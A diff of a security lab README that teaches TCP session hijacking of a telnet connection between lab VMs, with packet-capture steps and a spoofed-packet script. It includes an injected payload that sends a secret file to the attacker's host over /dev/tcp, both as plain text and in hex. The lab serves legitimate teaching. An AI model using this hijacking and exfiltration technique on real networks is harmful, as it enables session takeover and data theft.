@@ -6,58 +6,75 @@ In this lab, we will hijack a telnet session (between the victim client and the 
 
 ### Setup
 
-3 Linux VMs. VM1 as the victim (telnet client); VM2 as the telnet server; VM3 as the attacker. The 3 VMs reside in the same network.
+3 Linux VMs. VM1 as the victim (telnet client); VM2 as the telnet server; VM3 as the attacker. The 3 VMs reside in the same network. This README uses the following IP addresses.
+
+| VM Name | Role                 | IP Address |
+|---------|----------------------|------------|
+| VM1     | victim client        | 10.0.2.4   |
+| VM2     | victim telent server | 10.0.2.5   |
+| VM3     | attacker             | 10.0.2.6   |
 
 ### Steps
 
-1. let the client connect to the server using telnet.
+1. Let the client connect to the server using telnet.
 
 ![alt text](lab-tcp-hijack-telnet.png "Lab tcp session hijacking telnet")
 
-2. the client creates a secret file on the server.
+2. The client uses this *echo* command to create a secret file on the server.
 
+![alt text](lab-tcp-hijack-echo.png "Lab tcp session hijacking echo")
+
+3. The client uses the *cat* command to confirm the file now exists and is located at /home/seed/secret:
 ![alt text](lab-tcp-hijack-cat.png "Lab tcp session hijacking cat")
 
-3. let the attacker start monitoring network traffic using wireshark.
+4. Let the attacker start monitoring network traffic using wireshark.
 
-![alt text](lab-tcp-hijack-capture.png "Lab tcp hijack capture")
+![alt text](lab-tcp-hijack-start-wireshark.png "Lab tcp hijack start wireshark")
+![alt text](lab-tcp-hijack-start-capture.png "Lab tcp hijack start capture")
 
-4. client produces some telnet packets. (any telnet packets, you can just type a command like *ls*).
+5. Client produces some telnet packets. (any telnet packets, you can just type a command like *ls*).
 
 ![alt text](lab-tcp-hijack-ls.png "Lab tcp hijack ls command")
 
-5. attacker stops wireshark capturing, and navigates to the latest packet sent from the client to the server.
+6. Attacker stops wireshark capturing, and navigates to the latest packet sent from the client to the server. Now we need to examine this packet carefully, so as to obtain the ip addresses, the time to live (ttl) attribute, the port numbers, the next sequence number, the acknowledgment number, and the window size.
 
-This image shows the ip addresses, port numbers, sequence number, acknowledgment number.
-![alt text](lab-tcp-hijack-capture1.png "Lab tcp hijack latest tcp capture - part 1")
+This image shows the IP header, from which we see the ip addresses, and the time to live (ttl) attribute.
+![alt text](lab-tcp-hijack-ip-header.png "Lab tcp hijack latest tcp capture - part 1, ip header")
 
-This image shows the window size - still the same packet.
-![alt text](lab-tcp-hijack-capture2.png "Lab tcp hijack latest tcp capture - part 2")
+This image shows the TCP header, from which we see the port numbers, the next sequence number, the acknowledgment number, and the window size - still the same packet.
+![alt text](lab-tcp-hijack-tcp-header.png "Lab tcp hijack latest tcp capture - part 2, tcp header")
 
-This image shows the ttl attribute - still the same packet.
-![alt text](lab-tcp-hijack-capture3.png "Lab tcp hijack latest tcp capture - part 3")
+7. The above packet provides the information which the attacker needs to know in order to perform the tcp session hijack attack. Now, the attacker, mimicking the client, only needs to send one single regular TCP packet to the server. To send a regular TCP packet, a python script named send_tcp.py is provided. When running this script, it will send a TCP packet to a destination. You need to change the script so that the following 9 lines match with your situation.
 
-6. the above packet provides the information which the attacker needs to know in order to perform the tcp session hijacking attack. now, the attacker, mimicking the **client**, needs to use the *netwox 40* command to inject a telnet command. The netwox command should be in this format: # sudo netwox 40 --ip4-src *source_ip* --ip4-dst *destination_ip* --tcp-src *source_port* --tcp-dst *destination_port* --tcp-seqnum *sequence_number* --ip4-ttl *ttl_value* --tcp-window *window_size* --tcp-ack --tcp-acknum *acknowledgment_number* --tcp-data "putyourdatahere,in hex format". Remember to replace these italic texts with information captured in wireshark. To run the command, the attacker opens a terminal window, types the *netwox 40* command, and press enter.
+```console
+source_ip = "10.0.2.4"
+destination_ip = "10.0.2.5"
+source_port = 59830
+destination_port = 23
+sequence_num = 3366342961
+acknowledgment_num = 4096614496
+ttl_value = 64
+window_size = 501
+tcp_payload = "\rcat /home/seed/secret > /dev/tcp/10.0.2.6/9090\r"
+```
 
-**Note**: because the attacker is mimicking the client, thus the source ip address needs to be the client's IP address; from the captured latest packet, we can see the sequence number is *2523450797*, the acknowledgment number is *311613137*; the source port (in this example) is 57502, the destination port is 23. the tcp window size (in this example) is 245, the time to live (ttl) value is 64. The tcp data we can use is: "0d20636174202f686f6d652f736565642f736563726574203e202f6465762f7463702f61747461636b65725f69702f39303930200d".
+**Note**: because the attacker is mimicking the client, thus the source ip address needs to be the client's IP address; from the captured latest packet, we can see the next sequence number is *3366342961*, the acknowledgment number is *4096614496*; the source port (in this example) is *59830*, the destination port is 23. the tcp window size (in this example) is 501, the time to live (ttl) value is 64. The tcp data we can use is: "\rcat /home/seed/secret > /dev/tcp/10.0.2.6/9090\r".
 
-**Explanation**: why the tcp data is "0d20636174202f686f6d652f736565642f736563726574203e202f6465762f7463702f61747461636b65725f69702f39303930200d"? Because the telnet command we want to inject is: "cat /home/seed/secret > /dev/tcp/attacker_ip/9090", and we want this command to be sandwiched by two newline signs "\r", so that the command will not be concatenated with other random strings. assume the atacker's IP address is 172.16.77.130, then this is how we can convert this whole thing into hex:
+**Explanation**: The telnet command we want to inject is: "cat /home/seed/secret > /dev/tcp/attacker_ip/9090", but we want this command to be sandwiched by two newline signs "\r", so that the command will not be concatenated with other random strings.
 
-![alt text](lab-tcp-hijack-command-to-hex.png "Lab tcp hijack - the tcp data")
+**Explanation 2**: why the telnet command we want to inject is "cat /home/seed/secret > /dev/tcp/attacker_ip/9090". Because "cat /home/seed/secret" shows the content of the secret file, but this command will only display the content in the victim client's terminal window, not in the attacker's terminal window. This "cat /home/seed/secret > /dev/tcp/attacker_ip/9090" will redirect the output of the cat command into a tcp port 9090 at the attacker's ip address.
 
-Thus in this example, the netwox 40 command we are going to type is:
-![alt text](lab-tcp-hijack-command.png "Lab tcp hijack - the netwox command")
+8. Once the above 9 lines are modified correctly, we are ready to launch the attack, which is just running the python script. Before running the python script, the attacker needs to open another terminal window so that the attacker can listen on a port at the attacker's IP address - here we choose port 9090, which matches with what is specified in the python script.
 
-**Explanation 2**: why the telnet command we want to inject is "cat /home/seed/secret > /dev/tcp/attacker_ip/9090". Because "cat /home/seed/secret" shows the content of the secret file, but this command will only display the content in the victim client's terminal window, not in the attacker's terminal window. This "cat /home/seed/secret > /dev/tcp/attacker_ip/9090" will redirect the output of the cat command into a tcp port 9090 at the attacker's ip address. Thus we come to our next step,
-
-7. before pressing enter, the attacker needs to open another terminal window so that the attacker can listen on a port - we will choose port 9090.
-
+8.1. Listening in one terminal window:
 ![alt text](lab-tcp-hijack-listening.png "Lab tcp hijacking attack listening on port 9090")
 
-- after pressing enter:
-![alt text](lab-tcp-hijack-after-enter.png "Lab tcp hijacking attack after enter command")
+8.2. Run python script in another terminal window:
+- before and after pressing enter to run the script:
+![alt text](lab-tcp-hijack-before-enter.png "Lab tcp hijacking attack before pressing enter")
+![alt text](lab-tcp-hijack-after-enter.png "Lab tcp hijacking attack after pressing enter")
 
-7. once the attacker pressed enter to execute the above *netwox 40* command, if the attack is successful, the victim server's secret file will be displayed in the attacker's terminal window:
+9. Once the attacker pressed enter to execute the above script, if the attack is successful, the victim server's secret file will be displayed in the attacker's terminal window:
 
 ![alt text](lab-tcp-hijack-success.png "Lab tcp session hijacking attack successful")
 
